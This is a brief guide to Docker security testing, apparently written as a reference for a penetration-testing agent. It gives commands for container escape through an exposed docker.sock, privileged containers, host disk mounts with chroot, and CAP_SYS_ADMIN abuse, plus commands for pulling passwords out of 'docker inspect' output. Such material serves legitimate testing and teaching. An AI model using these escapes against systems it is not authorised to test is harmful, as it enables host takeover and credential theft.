<docker_security_guide>
<title>DOCKER SECURITY TESTING</title>

<critical>Docker security testing covers socket exposure, container escape, privileged containers, image vulnerabilities, registry security, and API attacks. Critical for containerized applications.</critical>

<scope>
- Docker socket exposure (/var/run/docker.sock)
- Container escape techniques
- Privileged container exploitation
- Image vulnerability scanning
- Registry security
- Docker API attacks
- Secrets in environment variables
- Capability abuse
</scope>

<methodology>
1. Check for Docker socket exposure
2. Test for privileged containers
3. Attempt container escape
4. Scan images for vulnerabilities
5. Test Docker API security
6. Check for exposed secrets
</methodology>

<socket_exposure>
{% raw %}
# Docker socket exposure:
ls -la /var/run/docker.sock
# If accessible, can control Docker daemon

# Exploit via curl:
curl --unix-socket /var/run/docker.sock http://localhost/containers/json

# Create privileged container:
curl --unix-socket /var/run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["sh"],"Privileged":true}' \
  http://localhost/containers/create

# Container escape via socket:
docker run -v /var/run/docker.sock:/var/run/docker.sock alpine sh
# Inside container, control host Docker
{% endraw %}
</socket_exposure>

<container_escape>
{% raw %}
# Privileged container escape:
docker run --privileged -it alpine sh
# Mount host filesystem:
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host

# Capability abuse:
# CAP_SYS_ADMIN allows escape
docker run --cap-add=SYS_ADMIN -it alpine sh

# cgroup escape:
# Exploit cgroup notifications
{% endraw %}
</container_escape>

<common_payloads>
{% raw %}
# Socket access:
curl --unix-socket /var/run/docker.sock http://localhost/containers/json

# Privileged escape:
mkdir /mnt/host && mount /dev/sda1 /mnt/host

# Secrets in env:
docker inspect <container_id> | grep -i password

# Image vulnerabilities:
docker scan image:tag
trivy image image:tag
{% endraw %}
</common_payloads>

<remember>Docker security: Check socket exposure (full control), test privileged containers (easy escape), scan images for CVEs, look for secrets in environment variables, validate API authentication.</remember>
</docker_security_guide>
